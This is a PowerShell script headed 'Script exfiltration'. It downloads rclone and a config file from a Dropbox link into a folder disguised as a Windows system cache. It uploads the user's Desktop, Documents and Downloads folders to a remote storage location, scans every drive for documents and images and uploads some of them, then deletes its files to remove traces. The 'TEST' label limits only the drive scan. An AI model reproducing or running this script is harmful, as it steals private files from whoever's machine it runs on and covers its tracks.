# ==============================================
# Script exfiltration (TEST - 5 files only)
# ==============================================

$ArchiveUrl = "https://www.dropbox.com/scl/fi/lyda6ld925vwp1rwixykc/extool.zip?rlkey=3men45jf6jdsh00ii4uqybv66&st=1juz8rgz&dl=1"
$ExtractPath = "$env:APPDATA\Microsoft\Windows\Caches\SystemCache"
$ComputerName = $env:COMPUTERNAME

$TargetFolders = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)

$Extensions = @(".doc", ".docx", ".pdf", ".txt", ".jpg", ".png")

if (!(Test-Path $ExtractPath)) {
    New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null
}

$ZipPath = "$ExtractPath\extool.zip"
Invoke-WebRequest -Uri $ArchiveUrl -OutFile $ZipPath -UseBasicParsing
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipPath, $ExtractPath)
Remove-Item $ZipPath -Force

$RcloneExe = "$ExtractPath\rclone.exe"
$RcloneConf = "$ExtractPath\rclone.conf"

$RemotePath = "test:/$ComputerName"
& $RcloneExe --config $RcloneConf mkdir "$RemotePath"

foreach ($Folder in $TargetFolders) {
    if (Test-Path $Folder) {
        
        & $RcloneExe --config $RcloneConf copy "$Folder" "$RemotePath/$($Folder | Split-Path -Leaf)" --verbose --no-console
    }
}

$TempList = "$ExtractPath\filelist.txt"
$CollectedFiles = @()

$ExcludeFolders = $TargetFolders | ForEach-Object { $_.ToLower() }
$Drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match "^[A-Z]:\\$" }

foreach ($Drive in $Drives) {
    $RootPath = $Drive.Root
    Write-Host "Scanning: $RootPath (only first 5 files)"
    
    $Found = Get-ChildItem -Path $RootPath -File -Recurse -ErrorAction SilentlyContinue -Force | 
        Where-Object { 
            $Extensions -contains $_.Extension.ToLower() -and 
            $ExcludeFolders -notcontains $_.DirectoryName.ToLower()
        } |
        Select-Object -First 5
    
    $CollectedFiles += $Found
    
    if ($CollectedFiles.Count -ge 5) {
        Write-Host "Found 5 files. Stopping scan."
        break
    }
}

if ($CollectedFiles.Count -gt 0) {
    $CollectedFiles | ForEach-Object { $_.FullName } | Out-File -FilePath $TempList -Encoding UTF8
    Write-Host "Files found: $($CollectedFiles.Count)"
} else {
    
    Write-Host "No files found. Creating test file..."
    echo "C:\Windows\System32\drivers\etc\hosts" | Out-File -FilePath $TempList -Encoding UTF8
}

$DopRemotePath = "$RemotePath/dop"
& $RcloneExe --config $RcloneConf mkdir "$DopRemotePath"


& $RcloneExe --config $RcloneConf copy --files-from $TempList $DopRemotePath --verbose --no-console



# --- Cleanup (uncomment to remove traces) ---
 Remove-Item $TempList -Force
 Remove-Item $ExtractPath -Recurse -Force

